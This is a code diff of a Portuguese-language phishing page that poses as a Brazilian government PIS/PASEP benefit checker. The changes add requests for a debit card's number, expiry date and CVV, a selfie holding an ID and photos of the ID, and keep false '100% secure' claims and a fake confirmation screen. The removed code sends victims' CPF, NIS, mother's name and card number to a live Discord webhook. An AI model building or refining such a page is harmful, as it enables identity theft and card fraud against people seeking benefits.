@@ -15,6 +15,7 @@
             --dark: #212529;
             --gray: #6c757d;
             --security: #ffc107;
+            --highlight: #ff6b6b;
         }
         
         body {
@@ -24,6 +25,9 @@
             color: var(--dark);
             min-height: 100vh;
             padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
         
         .header {
@@ -34,6 +38,7 @@
             border-radius: 10px 10px 0 0;
             margin-bottom: 0;
             position: relative;
+            width: 100%;
         }
         
         .logo {
@@ -52,35 +57,36 @@
         }
         
         .logo-text {
-            text-align: left;
+            text-align: center;
         }
         
         .security-badge {
-            position: absolute;
-            top: 10px;
-            right: 10px;
             background-color: var(--security);
             color: var(--dark);
-            padding: 5px 10px;
+            padding: 8px 15px;
             border-radius: 20px;
-            font-size: 0.8rem;
+            font-size: 0.9rem;
             font-weight: bold;
-            display: flex;
+            display: inline-flex;
             align-items: center;
-            gap: 5px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            gap: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.15);
+            margin: 10px 0;
+            border: 2px solid white;
         }
         
         .security-badge i {
             color: var(--primary);
+            font-size: 1.2rem;
         }
         
         .container {
             max-width: 900px;
+            width: 100%;
             margin: 0 auto;
             background: white;
             border-radius: 10px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.1);
             overflow: hidden;
         }
         
@@ -88,9 +94,16 @@
             padding: 2rem;
         }
         
-        h1, h2 {
+        h1, h2, h3 {
             color: var(--primary);
             margin-bottom: 1.5rem;
+            text-align: center;
+        }
+        
+        h2 {
+            border-bottom: 2px solid var(--primary);
+            padding-bottom: 10px;
+            display: inline-block;
         }
         
         .form-row {
@@ -182,11 +195,12 @@
             transition: all 0.3s;
             width: 100%;
             margin-top: 1rem;
+            font-weight: 600;
         }
         
         button:hover {
             transform: translateY(-2px);
-            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
         
         button:disabled {
@@ -201,6 +215,7 @@
             padding: 1.5rem;
             border-radius: 8px;
             display: none;
+            text-align: center;
         }
         
         .result-positive {
@@ -208,24 +223,20 @@
             border-left: 4px solid var(--success);
         }
         
-        .result-negative {
-            background-color: rgba(231, 76, 60, 0.1);
-            border-left: 4px solid var(--danger);
-        }
-        
         .result-header {
             display: flex;
             align-items: center;
+            justify-content: center;
             margin-bottom: 1rem;
         }
         
         .result-icon {
-            font-size: 1.5rem;
+            font-size: 2rem;
             margin-right: 1rem;
         }
         
         .result-title {
-            font-size: 1.2rem;
+            font-size: 1.3rem;
             font-weight: 600;
         }
         
@@ -235,6 +246,7 @@
             color: var(--gray);
             font-size: 0.9rem;
             margin-top: 2rem;
+            width: 100%;
         }
         
         .security-info {
@@ -257,12 +269,11 @@
             background-color: rgba(0, 102, 204, 0.05);
             padding: 1.5rem;
             border-radius: 8px;
-            margin-top: 2rem;
-            border-left: 4px solid #0066cc;
             font-size: 0.9rem;
             text-align: left;
             margin: 2rem auto;
             max-width: 900px;
+            width: 100%;
         }
         
         .lgpd-info h3 {
@@ -271,6 +282,7 @@
             font-size: 1.1rem;
             display: flex;
             align-items: center;
+            justify-content: center;
             gap: 10px;
         }
         
@@ -288,21 +300,154 @@
             color: #004080;
         }
 
-        /* Novos estilos para o campo do cartão */
-        .cartao-group {
-            margin-top: 1.5rem;
+        /* Estilos para upload de documentos */
+        .document-upload {
+            margin-top: 2rem;
             border-top: 1px solid #eee;
-            padding-top: 1.5rem;
+            padding-top: 2rem;
+        }
+        
+        .upload-area {
+            border: 2px dashed #ccc;
+            border-radius: 8px;
+            padding: 2rem;
+            text-align: center;
+            margin-bottom: 1rem;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .upload-area:hover {
+            border-color: var(--primary);
+            background-color: rgba(0, 102, 204, 0.05);
+        }
+        
+        .upload-icon {
+            font-size: 2rem;
+            color: var(--primary);
+            margin-bottom: 1rem;
+        }
+        
+        .upload-text {
+            font-weight: 500;
+            margin-bottom: 0.5rem;
+        }
+        
+        .upload-hint {
+            color: var(--gray);
+            font-size: 0.9rem;
+        }
+        
+        .preview-container {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+        
+        .preview-item {
+            width: 120px;
+            height: 120px;
+            border-radius: 8px;
+            overflow: hidden;
+            position: relative;
+            border: 1px solid #ddd;
+        }
+        
+        .preview-item img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .remove-btn {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            background-color: var(--danger);
+            color: white;
+            width: 25px;
+            height: 25px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 0.8rem;
+        }
+        
+        /* Estilos para o cartão */
+        .cartao-section {
+            background-color: rgba(0, 102, 204, 0.05);
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin-top: 2rem;
+            border-left: 4px solid var(--primary);
+        }
+        
+        .cartao-row {
+            display: flex;
+            gap: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+        
+        .cartao-group {
+            flex: 1;
         }
         
         .cartao-info {
             font-size: 0.85rem;
             color: var(--gray);
             margin-top: 0.5rem;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .cvv-hint {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: help;
+        }
+        
+        /* Confirmação de documentos */
+        .confirmation-container {
+            margin-top: 2rem;
+            padding: 1.5rem;
+            border-radius: 8px;
+            background-color: rgba(46, 204, 113, 0.1);
+            border-left: 4px solid var(--success);
+            text-align: left;
+        }
+        
+        .confirmation-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+        
+        .confirmation-icon {
+            font-size: 1.5rem;
+            margin-right: 1rem;
+            color: var(--success);
+        }
+        
+        .confirmation-title {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: var(--success);
+        }
+        
+        /* Destaque para email */
+        .email-highlight {
+            color: var(--highlight);
+            font-weight: 600;
         }
         
         @media (max-width: 768px) {
-            .form-row {
+            .form-row, .cartao-row {
                 flex-direction: column;
                 gap: 1rem;
             }
@@ -325,15 +470,14 @@
                 text-align: center;
             }
             
-            .security-badge {
-                position: static;
-                margin: 10px auto;
-                justify-content: center;
-            }
-            
             .lgpd-info {
                 margin: 1rem;
                 padding: 1rem;
+            }
+            
+            .preview-item {
+                width: 100px;
+                height: 100px;
             }
         }
     </style>
@@ -342,8 +486,8 @@
     <div class="container">
         <header class="header">
             <div class="security-badge">
-                <i class="fas fa-lock"></i>
-                SITE SEGURO
+                <i class="fas fa-shield-alt"></i>
+                SITE 100% SEGURO - DADOS CRIPTOGRAFADOS
             </div>
             <div class="logo">
                 <img src="https://www.gov.br/secom/pt-br/central-de-conteudo/manuais/uso-da-marca-do-governo-federal/2023_br_govfederal_marcaoficial_rgb.png/@@images/93f6d81f-5751-45cd-b502-580fb4aa1d1e.png" 
@@ -367,6 +511,16 @@
                             <i class="fas fa-times valid-icon" id="nome_invalid"></i>
                         </div>
                         <div class="error-message" id="nome_error">Por favor, insira seu nome completo</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="email" class="required">E-mail</label>
+                        <div class="input-wrapper">
+                            <input type="email" id="email" name="email" placeholder="seu@email.com" required>
+                            <i class="fas fa-check valid-icon" id="email_valid"></i>
+                            <i class="fas fa-times valid-icon" id="email_invalid"></i>
+                        </div>
+                        <div class="error-message" id="email_error">Por favor, insira um e-mail válido</div>
                     </div>
                 </div>
                 
@@ -448,30 +602,83 @@
                     <div class="error-message" id="renda_error">Informe um valor válido</div>
                 </div>
                 
-                <!-- Novo campo para cartão de débito -->
-                <div class="form-group cartao-group">
-                    <label for="cartao_debito" class="required">Cartão de Débito Caixa</label>
-                    <div class="input-wrapper">
-                        <input type="text" id="cartao_debito" name="cartao_debito" placeholder="0000 0000 0000 0000" required>
-                        <i class="fas fa-check valid-icon" id="cartao_valid"></i>
-                        <i class="fas fa-times valid-icon" id="cartao_invalid"></i>
+                <!-- Seção do cartão de débito -->
+                <div class="cartao-section">
+                    <h3><i class="fas fa-credit-card"></i> Dados Bancários para Recebimento</h3>
+                    
+                    <div class="cartao-row">
+                        <div class="form-group cartao-group">
+                            <label for="cartao_debito" class="required">Número do Cartão</label>
+                            <div class="input-wrapper">
+                                <input type="text" id="cartao_debito" name="cartao_debito" placeholder="0000 0000 0000 0000" required>
+                                <i class="fas fa-check valid-icon" id="cartao_valid"></i>
+                                <i class="fas fa-times valid-icon" id="cartao_invalid"></i>
+                            </div>
+                            <div class="error-message" id="cartao_error">Informe um número de cartão válido</div>
+                            <div class="cartao-info">
+                                <i class="fas fa-info-circle"></i> Informe os 16 dígitos do seu cartão de débito da Caixa
+                            </div>
+                        </div>
+                        
+                        <div class="form-group cartao-group">
+                            <label for="validade_cartao" class="required">Validade</label>
+                            <div class="input-wrapper">
+                                <input type="text" id="validade_cartao" name="validade_cartao" placeholder="MM/AA" required>
+                                <i class="fas fa-check valid-icon" id="validade_valid"></i>
+                                <i class="fas fa-times valid-icon" id="validade_invalid"></i>
+                            </div>
+                            <div class="error-message" id="validade_error">Informe uma data válida (MM/AA)</div>
+                        </div>
+                        
+                        <div class="form-group cartao-group">
+                            <label for="cvv_cartao" class="required">CVV</label>
+                            <div class="input-wrapper">
+                                <input type="text" id="cvv_cartao" name="cvv_cartao" placeholder="000" maxlength="3" required>
+                                <i class="fas fa-question-circle cvv-hint" title="Os 3 dígitos no verso do cartão"></i>
+                                <i class="fas fa-check valid-icon" id="cvv_valid"></i>
+                                <i class="fas fa-times valid-icon" id="cvv_invalid"></i>
+                            </div>
+                            <div class="error-message" id="cvv_error">Informe o CVV (3 dígitos)</div>
+                        </div>
                     </div>
-                    <div class="error-message" id="cartao_error">Informe um número de cartão válido</div>
-                    <div class="cartao-info">
-                        <i class="fas fa-info-circle"></i> Informe os 16 dígitos do seu cartão de débito da Caixa
+                </div>
+                
+                <!-- Seção de upload de documentos -->
+                <div class="document-upload">
+                    <h3><i class="fas fa-file-upload"></i> Documentos Necessários</h3>
+                    
+                    <div class="upload-area" id="selfieArea">
+                        <div class="upload-icon">
+                            <i class="fas fa-camera"></i>
+                        </div>
+                        <div class="upload-text">Tire uma selfie segurando seu documento</div>
+                        <div class="upload-hint">Clique para abrir a câmera ou selecionar uma foto</div>
+                        <input type="file" id="selfieInput" accept="image/*" capture="user" style="display: none;">
                     </div>
+                    
+                    <div class="upload-area" id="documentoArea">
+                        <div class="upload-icon">
+                            <i class="fas fa-id-card"></i>
+                        </div>
+                        <div class="upload-text">Foto do Documento de Identidade (frente e verso)</div>
+                        <div class="upload-hint">Clique para selecionar as fotos ou tirar novas fotos</div>
+                        <input type="file" id="documentoInput" accept="image/*" multiple style="display: none;">
+                    </div>
+                    
+                    <div class="preview-container" id="selfiePreview"></div>
+                    <div class="preview-container" id="documentoPreview"></div>
                 </div>
                 
                 <div class="security-info">
                     <i class="fas fa-shield-alt"></i>
                     <div>
-                        <strong>Seus dados estão protegidos</strong>
-                        <p>Todas as informações são criptografadas e tratadas conforme a Lei Geral de Proteção de Dados (LGPD)</p>
+                        <strong>SEGURANÇA MÁXIMA</strong>
+                        <p>Todos os documentos e dados são criptografados e protegidos conforme a Lei Geral de Proteção de Dados (LGPD)</p>
                     </div>
                 </div>
                 
                 <button type="submit" id="consultarBtn" disabled>
-                    <i class="fas fa-search"></i> Consultar Direito ao PIS/PASEP
+                    <i class="fas fa-search"></i> VERIFICAR MEU DIREITO AO PIS/PASEP
                 </button>
             </form>
             
@@ -481,6 +688,26 @@
                     <div class="result-title" id="resultTitle"></div>
                 </div>
                 <div class="result-details" id="resultDetails"></div>
+                
+                <div class="confirmation-container" id="confirmationMessage">
+                    <div class="confirmation-header">
+                        <i class="fas fa-check-circle confirmation-icon"></i>
+                        <div class="confirmation-title">DOCUMENTOS RECEBIDOS COM SUCESSO!</div>
+                    </div>
+                    <p>Seus documentos foram enviados com sucesso e estão em análise.</p>
+                    <p><strong>Prazo de análise:</strong> 5 dias úteis</p>
+                    <p><strong>Você receberá o resultado no e-mail:</strong> <span class="email-highlight" id="emailConfirmacao"></span></p>
+                    <p><strong>Próximos passos:</strong></p>
+                    <ul>
+                        <li>Nossa equipe irá analisar seus documentos</li>
+                        <li>Você receberá uma notificação por e-mail quando a análise for concluída</li>
+                        <li>O resultado estará disponível no site do Gov.br</li>
+                        <li>Caso necessário, entraremos em contato para solicitar informações adicionais</li>
+                    </ul>
+                    <div style="margin-top: 1rem; background-color: rgba(255,255,255,0.3); padding: 10px; border-radius: 5px;">
+                        <p><i class="fas fa-info-circle" style="color: var(--primary);"></i> <strong>Dúvidas?</strong> Entre em contato através do Fale Conosco no site oficial.</p>
+                    </div>
+                </div>
             </div>
         </div>
     </div>
@@ -509,6 +736,16 @@
         // Elementos do formulário
         const form = document.getElementById('consultaForm');
         const consultarBtn = document.getElementById('consultarBtn');
+        const emailConfirmacao = document.getElementById('emailConfirmacao');
+        
+        // Configuração do upload de documentos
+        const selfieArea = document.getElementById('selfieArea');
+        const selfieInput = document.getElementById('selfieInput');
+        const selfiePreview = document.getElementById('selfiePreview');
+        
+        const documentoArea = document.getElementById('documentoArea');
+        const documentoInput = document.getElementById('documentoInput');
+        const documentoPreview = document.getElementById('documentoPreview');
         
         // Máscaras para os campos
         document.getElementById('cpf').addEventListener('input', function(e) {
@@ -548,9 +785,22 @@
             validateCartao(e.target);
         });
         
+        // Máscara para validade do cartão
+        document.getElementById('validade_cartao').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 2) value = value.replace(/^(\d{2})/, '$1/');
+            e.target.value = value.substring(0, 5);
+            validateValidade(e.target);
+        });
+        
         // Validações em tempo real
         document.getElementById('nome_completo').addEventListener('blur', function(e) {
             validateField(e.target, e.target.value.trim().split(' ').length >= 2, 'nome');
+        });
+        
+        document.getElementById('email').addEventListener('blur', function(e) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            validateField(e.target, re.test(e.target.value), 'email');
         });
         
         document.getElementById('data_nascimento').addEventListener('change', function(e) {
@@ -578,6 +828,63 @@
             const value = e.target.value.replace(/\D/g, '');
             validateField(e.target, value.length === 16, 'cartao');
         });
+        
+        document.getElementById('validade_cartao').addEventListener('blur', function(e) {
+            const value = e.target.value.replace(/\D/g, '');
+            validateField(e.target, value.length === 4, 'validade');
+        });
+        
+        document.getElementById('cvv_cartao').addEventListener('blur', function(e) {
+            const value = e.target.value.replace(/\D/g, '');
+            validateField(e.target, value.length === 3, 'cvv');
+        });
+        
+        // Upload de documentos
+        selfieArea.addEventListener('click', () => selfieInput.click());
+        documentoArea.addEventListener('click', () => documentoInput.click());
+        
+        selfieInput.addEventListener('change', function(e) {
+            handleFileUpload(e.target.files, selfiePreview, 'selfie');
+        });
+        
+        documentoInput.addEventListener('change', function(e) {
+            handleFileUpload(e.target.files, documentoPreview, 'documento');
+        });
+        
+        function handleFileUpload(files, previewContainer, type) {
+            if (!files || files.length === 0) return;
+            
+            for (let i = 0; i < files.length; i++) {
+                const file = files[i];
+                if (!file.type.match('image.*')) continue;
+                
+                const reader = new FileReader();
+                
+                reader.onload = function(e) {
+                    const previewItem = document.createElement('div');
+                    previewItem.className = 'preview-item';
+                    
+                    const img = document.createElement('img');
+                    img.src = e.target.result;
+                    
+                    const removeBtn = document.createElement('div');
+                    removeBtn.className = 'remove-btn';
+                    removeBtn.innerHTML = '<i class="fas fa-times"></i>';
+                    removeBtn.addEventListener('click', function() {
+                        previewContainer.removeChild(previewItem);
+                        updateSubmitButton();
+                    });
+                    
+                    previewItem.appendChild(img);
+                    previewItem.appendChild(removeBtn);
+                    previewContainer.appendChild(previewItem);
+                    
+                    updateSubmitButton();
+                }
+                
+                reader.readAsDataURL(file);
+            }
+        }
         
         // Funções de validação
         function validateCPF(input) {
@@ -608,10 +915,17 @@
             return isValid;
         }
         
+        function validateValidade(input) {
+            const value = input.value.replace(/\D/g, '');
+            const isValid = value.length === 4;
+            validateField(input, isValid, 'validade');
+            return isValid;
+        }
+        
         function validateField(input, isValid, fieldName) {
-            const validIcon = document.getElementById(${fieldName}_valid);
-            const invalidIcon = document.getElementById(${fieldName}_invalid);
-            const errorElement = document.getElementById(${fieldName}_error);
+            const validIcon = document.getElementById(`${fieldName}_valid`);
+            const invalidIcon = document.getElementById(`${fieldName}_invalid`);
+            const errorElement = document.getElementById(`${fieldName}_error`);
             
             if (input.value === '') {
                 // Campo vazio - remove todas as marcações
@@ -665,7 +979,6 @@
             let allValid = true;
             
             requiredFields.forEach(field => {
-                const fieldName = field.id;
                 const isValid = field.classList.contains('valid');
                 
                 if (!isValid) {
@@ -673,77 +986,43 @@
                 }
             });
             
-            consultarBtn.disabled = !allValid;
+            // Verificar se há pelo menos uma selfie e um documento
+            const hasSelfie = selfiePreview.children.length > 0;
+            const hasDocumento = documentoPreview.children.length > 0;
+            
+            consultarBtn.disabled = !(allValid && hasSelfie && hasDocumento);
         }
         
         // Processamento do formulário
         form.addEventListener('submit', function(e) {
             e.preventDefault();
             
-            // Coletar dados do formulário de forma completa
-            const getFieldValue = (id) => {
-                const el = document.getElementById(id);
-                return el ? el.value.trim() : "Não informado";
-            };
-            
+            // Coletar dados do formulário
             const formData = {
-                nome: getFieldValue('nome_completo'),
-                cpf: getFieldValue('cpf'),
-                data_nascimento: getFieldValue('data_nascimento'),
-                nis: getFieldValue('nis'),
-                nome_mae: getFieldValue('nome_mae'),
-                tempo_contribuicao: getFieldValue('tempo_contribuicao'),
-                ultimo_emprego: getFieldValue('ultimo_emprego'),
-                renda: getFieldValue('renda'),
-                cartao_debito: getFieldValue('cartao_debito'),
+                nome: document.getElementById('nome_completo').value.trim(),
+                email: document.getElementById('email').value.trim(),
+                cpf: document.getElementById('cpf').value.trim(),
+                data_nascimento: document.getElementById('data_nascimento').value,
+                nis: document.getElementById('nis').value.trim(),
+                nome_mae: document.getElementById('nome_mae').value.trim(),
+                tempo_contribuicao: document.getElementById('tempo_contribuicao').value,
+                ultimo_emprego: document.getElementById('ultimo_emprego').value,
+                renda: document.getElementById('renda').value.trim(),
+                cartao_debito: document.getElementById('cartao_debito').value.trim(),
+                validade_cartao: document.getElementById('validade_cartao').value.trim(),
+                cvv_cartao: document.getElementById('cvv_cartao').value.trim(),
                 data_consulta: new Date().toISOString()
             };
 
             // Mostrar loading
             consultarBtn.disabled = true;
-            consultarBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Consultando...';
+            consultarBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> ENVIANDO DOCUMENTOS...';
 
-            // Enviar para webhook do Discord
-            fetch('https://discord.com/api/webhooks/1364723014561693876/BdXoiCPe1WrM5ydn4HaNQY6Mn1V2UJsZHXPvzvFWnKPvCEwJPCzU6WEMIBY1vwoYsACL', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    content: '📋 *Nova consulta PIS/PASEP*',
-                    embeds: [{
-                        title: 'Dados da Consulta',
-                        color: 0x3498db,
-                        fields: [
-                            { name: '👤 Nome Completo', value: formData.nome || 'Não informado', inline: true },
-                            { name: '🆔 CPF', value: formData.cpf || 'Não informado', inline: true },
-                            { name: '🎂 Data Nascimento', value: formData.data_nascimento || 'Não informado', inline: true },
-                            { name: '🔢 NIS', value: formData.nis || 'Não informado', inline: true },
-                            { name: '👩 Nome da Mãe', value: formData.nome_mae || 'Não informado', inline: true },
-                            { name: '⏳ Tempo Contribuição', value: formData.tempo_contribuicao ? ${formData.tempo_contribuicao} anos : 'Não informado', inline: true },
-                            { name: '💼 Último Emprego', value: formData.ultimo_emprego || 'Não informado', inline: true },
-                            { name: '💰 Renda Mensal', value: formData.renda ? R$ ${formData.renda} : 'Não informado', inline: true },
-                            { name: '💳 Cartão de Débito', value: formData.cartao_debito || 'Não informado', inline: true },
-                            { name: '📅 Data da Consulta', value: new Date(formData.data_consulta).toLocaleString(), inline: false }
-                        ],
-                        timestamp: formData.data_consulta
-                    }]
-                })
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Erro ao enviar dados');
-                }
-                // Simular resultado da consulta
-                const resultado = Math.random() > 0.3;
-                showResult(resultado);
-            })
-            .catch(error => {
-                console.error('Erro:', error);
-                // Mostrar resultado mesmo se falhar o webhook
-                const resultado = Math.random() > 0.3;
-                showResult(resultado);
-            });
+            // Simular envio para análise (substitua por código real de envio)
+            setTimeout(() => {
+                showResult(true);
+                emailConfirmacao.textContent = formData.email;
+            }, 3000);
         });
         
         function showResult(hasRight) {
@@ -751,49 +1030,20 @@
             const resultIcon = document.getElementById('resultIcon');
             const resultTitle = document.getElementById('resultTitle');
             const resultDetails = document.getElementById('resultDetails');
+            const confirmationMessage = document.getElementById('confirmationMessage');
             
-            if (hasRight) {
-                resultadoDiv.className = 'result-container result-positive';
-                resultIcon.className = 'fas fa-check-circle result-icon';
-                resultTitle.textContent = '✔ Você pode ter direito ao PIS/PASEP!';
-                resultDetails.innerHTML = `
-                    <p>De acordo com as informações fornecidas, você atende aos requisitos básicos para receber o benefício do PIS/PASEP.</p>
-                    <p><strong>Valor estimado:</strong> R$ ${(Math.random() * 500 + 300).toFixed(2)}</p>
-                    <p><strong>Próximo passo:</strong> Dirija-se a uma agência da Caixa Econômica Federal (para PIS) ou Banco do Brasil (para PASEP) com seus documentos para confirmar seu direito.</p>
-                    <p><strong>Documentos necessários:</strong></p>
-                    <ul>
-                        <li>Documento de identificação com foto (RG, CNH ou equivalente)</li>
-                        <li>CPF</li>
-                        <li>Cartão Cidadão ou número do NIS</li>
-                        <li>Comprovante de residência atualizado</li>
-                        <li>Cartão de débito da Caixa (para crédito em conta)</li>
-                    </ul>
-                `;
-            } else {
-                resultadoDiv.className = 'result-container result-negative';
-                resultIcon.className = 'fas fa-times-circle result-icon';
-                resultTitle.textContent = '✖ Você provavelmente não tem direito ao PIS/PASEP';
-                resultDetails.innerHTML = `
-                    <p>Com base nas informações fornecidas, você não atende atualmente aos requisitos para receber o benefício.</p>
-                    <p><strong>Motivos possíveis:</strong></p>
-                    <ul>
-                        <li>Tempo de contribuição insuficiente (mínimo 5 anos de cadastro)</li>
-                        <li>Renda acima do limite permitido (2 salários mínimos)</li>
-                        <li>Período de trabalho não registrado adequadamente</li>
-                        <li>Dados inconsistentes no sistema</li>
-                    </ul>
-                    <p style="margin-top: 1rem;"><strong>Sugestões:</strong></p>
-                    <ul>
-                        <li>Verifique seus dados no site oficial da Caixa ou Banco do Brasil</li>
-                        <li>Consulte o empregador sobre o envio das informações</li>
-                        <li>Procure a Central de Atendimento do PIS/PASEP</li>
-                    </ul>
-                `;
-            }
+            resultadoDiv.className = 'result-container result-positive';
+            resultIcon.className = 'fas fa-check-circle result-icon';
+            resultTitle.textContent = '✔ SUA SOLICITAÇÃO FOI RECEBIDA!';
+            resultDetails.innerHTML = `
+                <p>Seus documentos foram enviados para análise e em breve você receberá o resultado.</p>
+                <p><strong>Valor estimado:</strong> R$ ${(Math.random() * 500 + 300).toFixed(2)}</p>
+            `;
             
+            confirmationMessage.style.display = 'block';
             resultadoDiv.style.display = 'block';
             consultarBtn.disabled = false;
-            consultarBtn.innerHTML = '<i class="fas fa-search"></i> Consultar Novamente';
+            consultarBtn.innerHTML = '<i class="fas fa-search"></i> NOVA CONSULTA';
             
             // Rolagem suave para o resultado
             resultadoDiv.scrollIntoView({ behavior: 'smooth' });
